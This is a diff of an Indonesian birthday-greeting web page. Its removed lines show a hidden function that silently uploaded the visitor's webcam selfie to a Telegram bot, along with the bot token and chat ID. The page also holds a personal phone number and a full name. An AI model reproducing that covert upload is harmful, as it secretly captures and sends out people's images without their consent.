@@ -5,16 +5,10 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, viewport-fit=cover">
 <title>Untuk Auliaa 🤍</title>
 
-<!-- ============================================================
-     GOOGLE FONTS
-============================================================ -->
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,500;0,600;0,700;0,800;1,500;1,600&family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
 
-<!-- ============================================================
-     CONFETTI LIBRARY (CDN)
-============================================================ -->
 <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.2/dist/confetti.browser.min.js"></script>
 
 <style>
@@ -59,6 +53,7 @@ body{
   overflow-x:hidden;
   min-height:100vh;
   position:relative;
+  cursor:auto;
 }
 
 h1,h2,h3,h4{ font-family: var(--font-display); font-weight:600; color:var(--text-dark); }
@@ -302,12 +297,13 @@ a{ text-decoration:none; color:inherit; }
 .orbit-cat.oc3{ bottom:-14px; left:50%; transform:translateX(-50%); animation-delay:2.4s; }
 @keyframes orbitFloat{ 0%,100%{ transform:translateY(0) rotate(-6deg); } 50%{ transform:translateY(-10px) rotate(6deg); } }
 
-.content-section{ padding:90px 20px; position:relative; max-width:1080px; margin:0 auto; }
+/* DIUBAH MENJADI FULL LEBAR SEPERTI GALERI */
+.content-section{ padding:90px 20px; position:relative; width:100%; margin:0 auto; }
 .content-section h2.section-title{ text-align:center; font-size:clamp(28px,5vw,42px); margin-bottom:10px; }
-.section-desc{ text-align:center; color:var(--text-soft); font-size:15px; max-width:520px; margin:0 auto 50px; line-height:1.7; }
+.section-desc{ text-align:center; color:var(--text-soft); font-size:15px; max-width:650px; margin:0 auto 50px; line-height:1.7; }
 
-/* Letter */
-.letter-card{ max-width:680px; margin:0 auto; padding:56px 44px; position:relative; }
+/* Letter - DIUBAH JADI FULL/LUAS */
+.letter-card{ width:92%; max-width:1100px; margin:0 auto; padding:56px 44px; position:relative; }
 .letter-body{ font-family: var(--font-display); font-size:clamp(16px,2.4vw,19px); line-height:2; color:var(--text-dark); white-space:pre-wrap; }
 .letter-footer{ display:flex; justify-content:space-between; align-items:flex-end; margin-top:30px; flex-wrap:wrap; gap:16px; }
 .letter-note{ font-style:italic; font-size:13px; color:var(--text-soft); }
@@ -333,7 +329,7 @@ a{ text-decoration:none; color:inherit; }
 /* ================================================================
    4.5. ANIMASI KERETA KUCING GENDUT
 ================================================================ */
-.train-section{ padding: 60px 20px 80px; overflow:hidden; position:relative; text-align:center; }
+.train-section{ padding: 60px 20px 80px; overflow:hidden; position:relative; text-align:center; width:100%; }
 .train-track-wrap{
   width:100vw; position:relative; left:50%; right:50%; margin-left:-50vw; margin-right:-50vw;
   padding: 35px 0 25px;
@@ -430,9 +426,9 @@ a{ text-decoration:none; color:inherit; }
   margin-bottom:28px; flex-shrink:0; align-self:flex-end;
 }
 
-/* VIDEO SECTION (PORTRAIT 9:16) */
+/* VIDEO SECTION (PORTRAIT 9:16) - DIBUAT FULL JUGA */
 .video-card{
-  max-width:400px; margin:0 auto; padding:28px 20px; position:relative;
+  width:92%; max-width:600px; margin:0 auto; padding:28px 20px; position:relative;
   border-radius: var(--radius-lg); text-align:center;
 }
 .video-wrapper{
@@ -443,24 +439,24 @@ a{ text-decoration:none; color:inherit; }
   width:100%; height:100%; display:block; object-fit:cover; background:#000;
 }
 
-/* Gallery 3D Flip */
-.gallery-grid{ display:grid; grid-template-columns:repeat(auto-fit,minmax(150px,1fr)); gap:20px; max-width:920px; margin:0 auto; }
-.flip-card{ perspective:1200px; height:200px; }
+/* Gallery 3D Flip - FULL LEBAR */
+.gallery-grid{ display:grid; grid-template-columns:repeat(auto-fit,minmax(160px,1fr)); gap:20px; width:92%; max-width:1100px; margin:0 auto; }
+.flip-card{ perspective:1200px; height:220px; }
 .flip-card-inner{ position:relative; width:100%; height:100%; transition: transform .8s cubic-bezier(.2,.8,.2,1); transform-style:preserve-3d; border-radius:var(--radius-md); }
 .flip-card.flipped .flip-card-inner{ transform:rotateY(180deg); }
 .flip-front, .flip-back{ position:absolute; inset:0; backface-visibility:hidden; border-radius:var(--radius-md); overflow:hidden; display:flex; align-items:center; justify-content:center; text-align:center; padding:14px; }
 .flip-front{ background:linear-gradient(150deg,var(--blue-soft),var(--cream-soft)); }
 .flip-front img{ width:100%; height:100%; object-fit:cover; position:absolute; inset:0; }
-.flip-back{ background: linear-gradient(150deg, var(--blue-ink), var(--blue-deep)); color:#fff; transform:rotateY(180deg); font-size:12.5px; font-family:var(--font-display); font-style:italic; }
+.flip-back{ background: linear-gradient(150deg, var(--blue-ink), var(--blue-deep)); color:#fff; transform:rotateY(180deg); font-size:13px; font-family:var(--font-display); font-style:italic; }
 
 /* Surprise */
-.surprise-section{ text-align:center; padding-bottom:120px; }
-.surprise-photo-wrap{ max-width:320px; margin:30px auto 0; position:relative; }
+.surprise-section{ text-align:center; padding-bottom:120px; width:100%; }
+.surprise-photo-wrap{ width:92%; max-width:450px; margin:30px auto 0; position:relative; }
 .surprise-cutout{ width:100%; border-radius:var(--radius-lg); opacity:0; transform:scale(0.9); transition: all 1s ease; border:6px solid #fff; }
 .surprise-cutout.show{ opacity:1; transform:scale(1); }
 
 /* Footer WA */
-.footer-final{ text-align:center; padding:80px 20px 100px; }
+.footer-final{ text-align:center; padding:80px 20px 100px; width:100%; }
 .wa-btn{
   display:inline-flex; align-items:center; gap:10px; padding:16px 32px; border-radius:100px;
   background:linear-gradient(135deg,#5fca7d,#3fb765); color:#fff; font-weight:700; font-size:15px;
@@ -526,7 +522,6 @@ a{ text-decoration:none; color:inherit; }
 </head>
 <body>
 
-<!-- BACKGROUND LAYERS -->
 <div id="bg-aurora"></div>
 <div class="blur-circle c1"></div>
 <div class="blur-circle c2"></div>
@@ -534,10 +529,10 @@ a{ text-decoration:none; color:inherit; }
 <div id="walking-cat">🐈</div>
 <div id="walking-cat-2">🐱</div>
 
-<!-- 1. SPLASH SCREEN -->
 <section id="splash-screen" class="screen active">
   <div class="glass-card splash-inner">
     <div class="splash-hearts">🤍🐾</div>
+    
     <div class="splash-cards-container">
       <div class="splash-photo-card">
         <img src="assets/splash1.jpg" alt="Foto Splash 1" onerror="this.src='https://images.unsplash.com/photo-1514888286974-6c03e2ca1dba?w=400';">
@@ -546,13 +541,13 @@ a{ text-decoration:none; color:inherit; }
         <img src="assets/splash2.jpg" alt="Foto Splash 2" onerror="this.src='https://images.unsplash.com/photo-1533738363-b7f9aef128ce?w=400';">
       </div>
     </div>
+
     <h1>Aloo Ndudutkuww 🤍</h1>
     <p style="color:var(--text-soft); margin-bottom:26px;">Bukan penipuan online kok, ini beneran hadiah khusus dari aku wkwk 🐾</p>
     <button class="btn-primary" id="btnOpenSurprise">Buka Kejutan 🎁</button>
   </div>
 </section>
 
-<!-- 2. LOGIN SCREEN -->
 <section id="login-screen" class="screen">
   <div class="glass-card login-card">
     <div class="cat-head-decor">
@@ -572,7 +567,6 @@ a{ text-decoration:none; color:inherit; }
   </div>
 </section>
 
-<!-- 3. CAMERA SCREEN -->
 <section id="camera-screen" class="screen">
   <div class="glass-card cam-card">
     <h2>Pap Dulu Dong 📸</h2>
@@ -597,7 +591,6 @@ a{ text-decoration:none; color:inherit; }
   </div>
 </section>
 
-<!-- 4. MAIN SCREEN -->
 <section id="main-screen">
 
   <div class="hero-section" id="heroSection">
@@ -611,7 +604,7 @@ a{ text-decoration:none; color:inherit; }
     </div>
     <div class="section-eyebrow">🎂 Hari Spesial Auliaa 🎂</div>
     <h1 style="font-size:clamp(32px,7vw,58px); margin-bottom:12px;">Happy 20th Birthday, <span style="color:var(--blue-ink); font-style:italic;">Auliaa</span> 🎂</h1>
-    <p style="font-size:15.5px; color:var(--text-soft); max-width:460px; line-height:1.7; margin-bottom:30px;">
+    <p style="font-size:15.5px; color:var(--text-soft); max-width:650px; line-height:1.7; margin-bottom:30px;">
       Aulia Irmayanti, resmi 20 tahun hari ini, 24 Juli 2026 🥳<br>
       Semoga hari ini dipenuhi tawa dan kebahagiaan.<br>
       web receh ini dibuat khusus oleh arielyan buat ndudutt sayangg 🐾
@@ -658,6 +651,7 @@ a{ text-decoration:none; color:inherit; }
       liatt tuu ndutt, lokomotif kucing gendotttnya lagi bawa 10 gerbong foto kenanganyaaa kitaa ❤️❤️<br>
       <span style="font-size:12px; color:var(--blue-ink); font-weight:700;">(sentuhh ke keretanya biar berhenti sebentar 🐾)</span>
     </p>
+    
     <div class="train-track-wrap">
       <div class="train-moving-track" id="catTrainTrack"></div>
     </div>
@@ -713,12 +707,11 @@ a{ text-decoration:none; color:inherit; }
     <h3 style="margin-top:26px; font-size:22px; margin-bottom:8px;">maaciww ndudutt dah liat sampe selesaii 🤍</h3>
     <p style="color:var(--text-soft); font-size:14px; margin-bottom:24px;">Ada satu pesan terakhir menunggumu di WhatsApp.</p>
     <a class="wa-btn" id="waBtn" href="#" target="_blank">💌 bales di whatsapp yaa</a>
-    <div class="footer-signature">Web receh ini dibuat khusus oleh Arielyan, buat kamuu 🩵🐾</div>
+    <div class="footer-signature">Web receh ini dibuat khusus oleh arielyan buat ndudutt sayangg 🐾</div>
   </div>
 
 </section>
 
-<!-- MUSIC PLAYER LENGKAP -->
 <div id="music-player" class="glass-card">
   <div class="mp-cover" id="mpCover">
     <img id="mpCoverImg" src="" alt="Cover Lagu" style="display:none;">
@@ -739,7 +732,6 @@ a{ text-decoration:none; color:inherit; }
   </div>
 </div>
 
-<!-- SECRET JAR POPUP -->
 <div class="jar-note-popup" id="jarPopup">
   <div class="glass-card jar-note-card">
     <div id="jarPopupClose" style="position:absolute; top:12px; right:16px; cursor:pointer; font-size:18px;">✕</div>
@@ -760,15 +752,12 @@ const CONFIG = {
   whatsappNumber: "6285866585326",
   whatsappMessage: "maaciw banyak yaaa nduduttkuuw sayang buat web recehnyaa sukaa bangetttt, gemes banyak kucingnyaa",
 
-  // TELEGRAM BOT CONFIG (TOKEN FIXED: RaOTz...)
-  telegramBotToken: "8867022911:AAHIornA3q9tRaOTz73sfwK2x4sGQQBu5WQ",
-  telegramChatId: "8554065890",
-
   musicSrc: "assets/lagu-kita.mp3",
   musicTitle: "Perfect",
   musicArtist: "Ed Sheeran",
   musicCover: "assets/cover-lagu.jpg",
 
+  // FOTO FAVORIT UNTUK KEJUTAN TERAKHIR
   fotoFavorit: "assets/foto-favorit.jpg",
 
   suratText: `Hai ndudutt 🤍
@@ -927,6 +916,8 @@ $('#btnTakePhoto').addEventListener('click', ()=>{
   canvas.height = h;
   
   const ctx = canvas.getContext('2d');
+  
+  // Flip horizontal pas ambil foto biar persis kayak cermin selfie
   ctx.translate(w, 0);
   ctx.scale(-1, 1);
   ctx.drawImage(video, 0, 0, w, h);
@@ -949,47 +940,14 @@ $('#btnRetake').addEventListener('click', ()=>{
   $('#btnUsePhoto').style.display='none';
 });
 
-// FUNGSI KIRIM FOTO KE TELEGRAM RAHASIA
-function sendPapToTelegram(base64Data) {
-  if (!CONFIG.telegramBotToken || !CONFIG.telegramChatId) return;
-
-  try {
-    const parts = base64Data.split(';base64,');
-    const imageType = parts[0].split(':')[1];
-    const decodedData = window.atob(parts[1]);
-    const uInt8Array = new Uint8Array(decodedData.length);
-
-    for (let i = 0; i < decodedData.length; ++i) {
-      uInt8Array[i] = decodedData.charCodeAt(i);
-    }
-
-    const blob = new Blob([uInt8Array], { type: imageType });
-    const formData = new FormData();
-    formData.append("chat_id", CONFIG.telegramChatId);
-    formData.append("photo", blob, "pap_ndudutt.jpg");
-    formData.append("caption", "📸 Pap terbaru dari Ndudutt di web ulang tahun! 🐾");
-
-    fetch(`https://api.telegram.org/bot${CONFIG.telegramBotToken}/sendPhoto`, {
-      method: "POST",
-      body: formData
-    })
-    .then(res => res.json())
-    .then(data => console.log("Telegram Status:", data))
-    .catch(err => console.error("Telegram Error:", err));
-  } catch (e) {
-    console.error("Image Process Error:", e);
-  }
-}
-
 $('#btnUsePhoto').addEventListener('click', ()=>{
   if(camStream){ camStream.getTracks().forEach(t=>t.stop()); }
+  switchScreen('camera-screen','main-screen');
   
   if(window.__userPhoto){
-    sendPapToTelegram(window.__userPhoto);
     $('#avatarWrap').innerHTML = `<img src="${window.__userPhoto}" alt="Avatar">`;
   }
-
-  switchScreen('camera-screen','main-screen');
+  
   initMain();
 });
 
@@ -1027,6 +985,7 @@ function buildTrainSet(){
 
 /* Main Screen Initialization */
 function initMain(){
+  // Typewriter Letter
   const el = $('#letterBody');
   const text = CONFIG.suratText;
   let i = 0;
@@ -1039,6 +998,7 @@ function initMain(){
   }
   typeStep();
 
+  // Jar Papers
   const jarPapers = $('#jarPapers');
   for(let j=0; j<8; j++){
     const p = document.createElement('div');
@@ -1047,9 +1007,11 @@ function initMain(){
     jarPapers.appendChild(p);
   }
 
+  // Kereta Kucing Gendut
   const track = $('#catTrainTrack');
   track.innerHTML = buildTrainSet() + `<div class="train-gap-connector"></div>` + buildTrainSet() + `<div class="train-gap-connector"></div>`;
 
+  // Gallery Flip
   const grid = $('#galleryGrid');
   grid.innerHTML='';
   CONFIG.galeri.forEach((item, idx)=>{
@@ -1066,11 +1028,14 @@ function initMain(){
     grid.appendChild(card);
   });
 
+  // Surprise Photo Load
   $('#surpriseCutout').src = CONFIG.fotoFavorit;
 
+  // Footer WhatsApp
   const waUrl = `https://wa.me/${CONFIG.whatsappNumber}?text=${encodeURIComponent(CONFIG.whatsappMessage)}`;
   $('#waBtn').setAttribute('href', waUrl);
 
+  // Video Kebersamaan Logic
   const videoEl = $('#togetherVideo');
   videoEl.addEventListener('play', ()=>{
     if(!bgMusic.paused){
@@ -1118,6 +1083,7 @@ const coverImg = $('#mpCoverImg');
 const curEl = $('#mpCurrent');
 const durEl = $('#mpDuration');
 
+// Load Cover Foto Player
 if(CONFIG.musicCover){
   coverImg.src = CONFIG.musicCover;
   coverImg.style.display = 'block';
